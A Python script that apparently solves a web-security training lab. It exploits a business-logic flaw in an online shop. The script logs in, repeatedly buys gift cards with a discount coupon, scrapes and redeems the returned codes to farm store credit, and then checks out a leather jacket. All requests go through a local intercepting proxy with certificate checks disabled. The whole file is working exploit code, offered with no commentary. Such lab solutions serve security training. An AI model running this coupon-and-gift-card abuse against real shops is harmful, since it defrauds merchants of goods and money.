import requests
import sys
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxy = {'http': 'http://127.0.0.1:8080', "https": "http://127.0.0.1:8080"}


def price_tampering(url, session):
    print("[*] Obtaining CSRF token for logging in")
    login_csrf = get_csrf(url + "/login", session)
    print("[*] CSRF token obtained successfully")
    print("[*] Loggin in as Wiener")
    login_response = login(url, login_csrf, session)
    print("[*] Obtaining CSRF token for the coupon")
    copoun_csrf = get_csrf(url, session)
    copoun = "SIGNUP30"
    print("[*] CSRF token obtained successfully")
    print("[*] Obtaining cart CSRF token")
    print("[*] Adding and redeeming the following gift cards")
    soup = BeautifulSoup(login_response.text, "html.parser")
    for i in range(0, 10):
        gift_codes = get_codes(url, session, i)
        redeem_codes(url, session, gift_codes)
    print("[*] Adding Jacket to cart")
    data = {"productId": "1", "redir": "PRODUCT", "quantity": "1"}
    jacket = session.post(proxies=proxy,
                          data=data,
                          verify=False,
                          url=url + "/cart")
    print("[*] Leather jacket was added to cart successfully")
    print("[*] placing order")
    final_csrf = get_csrf(url + "/cart", session)
    final_order = session.post(url=url + "/cart/checkout",
                               proxies=proxy,
                               verify=False,
                               data={"csrf": final_csrf})
    if final_order.status_code == 200 and "Not enough store credit for this purchase" not in final_order.text:
        print("[*] The Jacket was ordered successfully")
        print("[*] Lab Solved !!")


def get_codes(url, session, quantity):
    quantity = quantity * 6
    data = {"productId": "2", "redir": "PRODUCT", "quantity": 14 + quantity}
    add_to_cart = session.post(proxies=proxy,
                               data=data,
                               verify=False,
                               url=url + "/cart")
    cart_csrf = get_csrf(url + "/cart", session)
    apply_coupon = session.post(proxies=proxy,
                                verify=False,
                                data={"csrf": cart_csrf, "coupon": "SIGNUP30"},
                                url=url + "/cart/coupon")
    place_order = session.post(proxies=proxy,
                               verify=False,
                               data={"csrf": cart_csrf},
                               url=url + "/cart/checkout")

    soup = BeautifulSoup(place_order.text, "html.parser")
    codes = soup.find_all("td")[8:]
    return codes


def redeem_codes(url, session, codes):
    for code in codes:
        csrf = get_csrf(url + "/login", session)
        print(code.string)
        response = session.post(url=url + "/gift-card",
                                verify=False,
                                proxies=proxy,
                                data={"csrf": csrf, "gift-card": code.string})
        if response.status_code == 400:
            break
        print("[*] " + str(response.status_code))


def login(url, csrf, session, username="wiener", password="peter"):
    login_data = {"csrf": csrf, "username": username.strip(), "password": password.strip()}
    login_url = url + "/login"
    login_response = session.post(url=login_url,
                                  data=login_data,
                                  proxies=proxy,
                                  verify=False,
                                  )
    if "Invalid username or password." not in login_response.text and login_response.status_code == 200:
        print("[*] Login successful")
        return login_response
    else:
        print("[*] Login Failed")
        print(login_response.status_code)
        sys.exit(-1)


def get_csrf(url, session):
    response = session.get(url, verify=False, proxies=proxy)
    soup = BeautifulSoup(response.text, "html.parser")

    csrf_token = soup.find_all("input", {"name": "csrf"})[0]['value']

    return csrf_token


def main():
    if len(sys.argv) != 2:
        print("[*] Wrong tool Usage!")
        print(f"[*] Usage {sys.argv[0]} <url>")
        print(f"[*] Example {sys.argv[0]} https://example.com ")
        sys.exit(-1)
    else:
        session = requests.Session()

        price_tampering(sys.argv[1], session)


if __name__ == "__main__":
    main()
